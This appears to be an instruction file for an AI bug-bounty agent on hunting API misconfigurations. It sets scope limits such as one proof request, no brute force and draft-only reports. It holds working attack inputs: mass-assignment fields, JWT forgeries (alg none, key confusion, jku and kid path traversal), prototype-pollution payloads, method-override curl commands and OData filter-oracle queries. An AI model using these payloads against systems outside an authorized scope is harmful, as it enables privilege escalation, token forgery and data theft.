---
name: hunt-api-misconfig
description: "Hunt API security misconfiguration — mass assignment, JWT attacks (alg=none, RS256/HS256 key confusion, kid/jku/x5u/x5c injection; not HMAC secret brute-force), prototype pollution, HTTP verb tampering, OData $filter/$orderby ACL bypass, exposed OpenAPI/Swagger. Mass assignment: extra fields such as is_admin, role, verified, tenant_id on profile or update bodies. Prototype pollution: __proto__ / constructor.prototype in JSON merge reaching a sink. HTTP verb: X-HTTP-Method-Override, method override via _method, authz checked on the wrong verb. CORS misconfiguration is owned by hunt-cors. Use when hunting API misconfigs, JWT flaws, mass-assignment, prototype pollution, OData, or Swagger/OpenAPI exposure."
---

## Decision tree

| You see | Do once | Proves |
|---|---|---|
| `PATCH`/`POST` JSON object saved to a user/order | Add `role`/`is_admin`/`verified`/`price`/`tenant_id` the UI never sends | Re-read returns the extra field, and a privileged action succeeds |
| `Authorization: Bearer eyJ…` or a JWT cookie | Decode header. Test `alg` confusion and embedded `jwk`/`jku` — do not guess the HMAC secret | Forged token reads another user's object |
| JSON merge, `qs` query, or `lodash`/`_.merge` on the server | `__proto__` / `constructor.prototype` with a unique property | Property appears on a later request's behavior, or a proven gadget fires |
| Authz only documented for `POST` | Same path with `GET`, `PUT`, and `X-HTTP-Method-Override` | State change or data the other verb was meant to block |
| `OData-Version` or `/odata/` or `/_api/` | `$metadata`, then one `$filter`/`$orderby` on a field you should not see | Foreign row or a boolean oracle on a sensitive column |
| `swagger.json` / `/v3/api-docs` | Diff paths vs the UI | One hidden route with weaker authz |

Echoing your field back in the same response is not persistence. `GET` the object again.

## Mass assignment

Send one extra field at a time on the write the app already allows (`/me`, `/profile`, `/users`, signup, cart, invite). Re-read.

```json
{"role":"admin","is_admin":true,"isAdmin":true,"verified":true,"email_verified":true,
 "tenant_id":"B","org_id":"B","account_id":"B","price":0,"balance":0,"permissions":["*"]}
```

Also: form-encoded instead of JSON, `role=user&role=admin` (parser takes the last), a JSON array wrapping one object, and nested `user[role]=admin`. GraphQL input objects are the same bug (`hunt-graphql`). Impact is the **privileged action** that now works, not the field sitting in JSON.

## JWT (no secret brute-force)

Decode the token. Attacks below forge a token when the **verifier is confused**. They do not recover a strong HMAC secret. If the only key is a high-entropy HMAC secret, stop this branch and hunt `kid`/`jku` or a leaked key in a bundle (`hunt-source-leak`).

| Attack | Token shape | Accept if |
|---|---|---|
| `alg: none` | header `{"alg":"none","typ":"JWT"}`, payload with your `sub`/`role`, **empty** signature segment. Try `none` / `None` / `NONE` | API returns B's resource for B's `sub` |
| RS256→HS256 | Server verifies RS256. You HMAC-sign with the **public** PEM bytes as the HS256 secret | Same, and only if the library treats the PEM as the HMAC key |
| Embedded JWK | header `jwk` is your RSA public key, `alg` RS256, you sign with the matching private key | Server trusts the in-token key |
| `jku` / `x5u` | header URL points at a JWKS you host; the token's `kid` matches that set | Server fetches your URL (OOB) **and** accepts the token |
| `x5c` | header carries your cert chain | Accepted without pinning |
| `kid` file / empty key | `kid` is `../../../../dev/null` or a path the process can read, signed with the bytes that file returns (empty for `/dev/null`) | Accepted. This is a path read, not a wordlist |
| `kid` SQL/command injection | only if `kid` is concatenated and an error or OOB shows it | One proof request, not a dump |

`jku` to an internal URL is SSRF (`hunt-ssrf`) even when the token is rejected. Claim what happened.

Validation: one request as the victim `sub` that returns data your real session cannot, or a state change. A token that decodes locally and gets `401` is not confusion. Do not brute-force or crack HMAC secrets.

## Prototype pollution

```json
{"__proto__":{"isAdmin":true,"marker":"ppm-<rand>"}}
{"constructor":{"prototype":{"isAdmin":true}}}
```

Query form when the server uses `qs`: `?__proto__[isAdmin]=true&__proto__[marker]=ppm-<rand>`.

A polluted prototype is a finding only if it changes a later security decision or hits a gadget you can show (template `outputFunctionName`, `child_process` `shell`/`NODE_OPTIONS`, a client-side sink — `hunt-dom`, `hunt-rce`). A JSON body that is stored and reflected as the key `__proto__` without changing `Object.prototype` is just a weird field. Unique marker so you can see it on a **second** request that did not send it.

## HTTP verb tampering

```bash
curl -s -X GET "https://$TARGET/api/user/delete?id=SELF" -H "Authorization: Bearer $A"
curl -s -X POST "https://$TARGET/api/user/delete?id=SELF" \
  -H "X-HTTP-Method-Override: DELETE" -H "Authorization: Bearer $A"
curl -s -X POST "https://$TARGET/api/user/profile" -d "_method=PUT&role=admin"
```

Use your own object. Authz middleware that only wraps `POST` is the bug when `GET` or the override verb performs the action. `TRACE` reflecting `Cookie` is a finding only if a browser will actually send it cross-site (usually Low); quote the reflected header. CORS itself is `hunt-cors`.

## OData (`$filter` / `$orderby` / `$batch`)

Surfaces: `OData-Version`, `DataServiceVersion`, `/odata/`, `/_api/`, `/api/data/v9.x/`, `/sap/opu/odata/`. `$metadata` anonymous → entity set names.

| Class | Request | Proof |
|---|---|---|
| Filter oracle | `GET …/contacts?$filter=startswith(email,'a')` | Count or rows change with the prefix. Prove **two characters** of a field you should not read, then stop. Do not reconstruct a password database |
| Sort leak | `$orderby=secretField desc&$select=id` | Order of public ids reveals the hidden column |
| Expand IDOR | `$expand=Customer($expand=PaymentMethods)` | Nested entity you cannot `GET` directly |
| Batch parser gap | `POST $batch` `multipart/mixed` with the same `$filter` the WAF blocked on the outer URL | Inner query returns rows; outer query was blocked |
| Encoding | `$filter=` vs `%24filter=` vs `%2524filter=` | One encoding bypasses the filter and returns rows |

`$filter=Name eq 'x'` that returns a SQL error is a lead for injection (`hunt-sqli`), not this finding, until the query's result differs. Deep recursion / billion-laughs against the parser is DoS — do not send it. CVE-2019-17554 (Apache Olingo XXE via `application/xml`) is in-scope as a single OOB entity, not a file-read marathon.

## OpenAPI / Swagger

Fetch `/swagger/v1/swagger.json`, `/v3/api-docs`, `/openapi.json`, `/docs`, `/redoc`, `/q/openapi` (full list in `hunt-source-leak`). SPA `200` of `index.html` is not a spec.

- Paths the UI never calls → request as a low-priv user (hidden admin route).
- Schema fields the UI never sends → mass-assignment list.
- Swagger UI `?configUrl=` / `?url=` loading a remote spec → XSS only with script execution on that origin (historical Swagger UI DOM XSS; version-gate). Do not claim it from the parameter reflecting.

## Validation

- Re-read after every write. Body-diff A vs B.
- JWT: the forged token must be the one the server accepted (log both). A decoded token that still gets `401` is not confusion.
- Pollution: marker visible on a request that did not include it, or a gadget you ran once.
- OData: two-character oracle or one expanded foreign object. Stop.
- No HMAC brute-force, no credential stuffing, no table dumps, no parser DoS.

## Chains

- `role` sticks → privileged API → `hunt-ato` if it changes someone else's account (use your second test user).
- JWT `alg` confusion → any `sub` → `hunt-idor` at scale of ids you can already see. Do not call it a full user-base dump without a list endpoint.
- `jku` fetches your host → SSRF → metadata (`hunt-ssrf`).
- Prototype pollution gadget → `hunt-rce` or client XSS (`hunt-dom`). One shot.
- Spec → unauthenticated admin route → `hunt-api-owasp` API5.

## Before you report — dedup gate

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless the field, verb, or a fix bypass is a concrete differentiator. Draft only — do not submit.

Cross-refs: `hunt-jwt`, `hunt-idor`, `hunt-cors`, `hunt-ssrf`, `hunt-graphql`, `hunt-source-leak`, `triage-validation`.
